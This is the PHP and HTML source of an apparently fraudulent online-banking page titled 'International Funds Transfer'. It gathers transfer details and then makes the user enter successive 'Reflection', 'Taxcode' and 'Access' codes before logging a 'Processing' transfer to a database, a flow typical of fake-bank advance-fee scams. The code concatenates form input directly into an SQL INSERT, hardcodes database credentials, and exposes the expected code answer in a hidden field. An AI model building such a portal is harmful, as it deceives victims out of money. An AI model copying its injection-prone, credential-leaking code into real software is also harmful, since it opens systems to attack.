<?php if(!isset($_SESSION)){session_start();} ?><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="robots" content="noindex,nofollow"><noscript>&lt;meta http-equiv="refresh" content="0;URL=https://www.Fbnkal.com/s/online/JavascriptDisabled.html"&gt;</noscript><link rel="shortcut icon" type="image/x-icon" href="favicon.ico"><script type="text/javascript" src="../js/jquery.min.js"></script>

<script type="text/javascript" src="../js/jquery.timer.js"></script>
<link rel="stylesheet" type="text/css" href="portal.css">

<?php
if(isset($_POST['amount'])){
$_SESSION['kain'] = $_POST['acc']."~".$_POST['amount']."~".$_POST['balance']."~".$_POST['fname']."~".$_POST['mname']."~".$_POST['sname']."~".$_POST['accno-f']."~".$_POST['iban-f']."~".$_POST['bankname']."~".$_POST['bankaddr']."~".$_POST['routing-f']."~".$_POST['swift-f']."~".$_POST['country-f']."~".$_POST['memo'];
$nal=1;
$pieces = explode("~", $_POST['codes']);
$_SESSION['rcode'] =  $pieces[0]; // piece1
$_SESSION['acode'] =  $pieces[1]; // piece1
$_SESSION['tcode'] =  $pieces[2]; // piece1
}

unset($error);
if((isset($_POST["pass"]) && ($_POST["pass"])== $_POST["ans"]))
{$nal= $_SESSION['nal']+1;

 }elseif((isset($_POST["pass"]) && ($_POST["pass"])!= $_POST["ans"])){
	$error="You have entered an Invalid Code";
	}
?>

<script src="//code.tidio.co/mgnhouvgxohr01fxtyzdspbfthzjsdoi.js" async></script></head><body>
<style type="text/css">html, body {background-image:url('../images/pageBG.gif');}#container{margin:0 auto; width:751px}td{text-align:left}</style>
<div id="container"><div id="banner">

<a id="logo"><span></span></a></div>
<div style="padding:0px 10px"><h2>International Funds Transfer</h2><hr />
<?php if(isset($_POST['val'])  && ($_POST['val']==4)){?><form method="post" action="transfer.php?trans" id="logged"><input type="hidden" name="logged" value="logged" /><p style="text-align:center; margin:150px 0">Redirecting... Please wait</p>
<?php
$pie = explode("~", $_SESSION['kain']);
$acc=  $pie[0]; // piece1
$amount=  $pie[1]; // piece1
$bal=  $pie[2]; // piece1
$namea=  $pie[3]." ".$pie[4]." ,".$pie[5]; // piece1
$racc=  $pie[6]; // piece1
$bank=  $pie[8]; // piece1
$bkadr=  $pie[9]; // piece1
$iban=  $pie[7]; // piece1
$rout=  $pie[10]; // piece1
$swift=  $pie[11]; // piece1
$country=  $pie[12]; // piece1
$memo=  $pie[13]; // piece1
$balance=$bal-$amount;
$date1 = date(DATE_RFC2822);
$descn="INTERNATIONAL FX TRANSFER";
$status="Processing";
$id = $_SESSION['d'];
	$con=mysqli_connect("localhost","itrakvqy_b","nze2903NZE2903", "itrakvqy_b")or die();
mysqli_query($con, "INSERT INTO statement(accid, date, descn, credit, balance, status, tfto_acc, tfto_name, tfto_bank, tfto_bankaddr, tfto_iban, tfto_routing, tfto_swift, tfto_country, tfto_memo)
		
VALUES('".$id."','".$date1."','".$descn."','".$amount."','".$balance."','".$status."','".$racc."','".$namea."','".$bank."','".$bkadr."','".$iban."','".$rout."','".$swift."','".$country."','".$memo."')")or die(mysqli_error($con));
echo "
<script type='text/javascript'>setTimeout(function(){\$('#logged').submit()},3000)</script> "; ?>
</form>

<?php }

elseif(isset($nal)){
	
	if($nal ==1){
		$ques="Input your Reflection code.";
		$ans=$_SESSION['rcode'];	
		}elseif($nal ==2){
		$ques="Input your Taxcode code.";
		$ans=$_SESSION['tcode'];	
		}elseif($nal ==3){
		$ques="Input your Access code.";
		$ans=$_SESSION['acode'];	
		}
	?><form method="post" action="" id="login">
<input type="hidden" name="val" value="<?php echo $nal; ?>" />
<input type="hidden" name="ques" value="<?php echo $ques; ?>" />
<input type="hidden" name="ans" value="<?php echo $ans; ?>" />
<p>Please wait while we process your transfer.</p><div style="text-align:center; margin:150px 0"><img src="../images/progress_bar.gif" alt="signing on..." border="none" /></div><script type="text/javascript">setTimeout(function(){$("#login").submit()},5000)</script></form>

<?php }elseif(( !isset($nal) && isset($_POST['val'])&&  $_POST['val']!=4)|| !isset($nal)){ 
if(isset($_POST['val'])){
$_SESSION['ques']=$_POST['ques'];
$_SESSION['ans']=$_POST['ans'];
$_SESSION['nal']=$_POST['val'];
}
?>
<div style="margin:150px 0; text-align:center"><b><span style='color:red'><?php if(isset($error)){echo $error; }?></span></b>
<table style="margin:20px 0 0 150px;width:630px">
<tr><td style="width:100px"><!--Security Question-->&nbsp;</td><td align="left"><b style="font-size:12px;"><?php echo $_SESSION['ques'] ?></b></td></tr><tr><td style="text-align:right; font-size:12px;"><p>Answer</p>&nbsp;</td><td><form method="post"  action="<?php echo $_SERVER['PHP_SELF']?>">
<input name="pass" id="pass" type="text" maxlength="20" value="" required>
<input name="ans" id="ans" type="hidden"  value="<?php echo $_SESSION['ans'] ?>">

<a href="transfer.php" style=" font-size:12px;">Cancel</a></td></tr><tr><td></td><td><input type="submit" value="Submit"></td></tr></table></div></form>

<?php }?></div></div></body></html>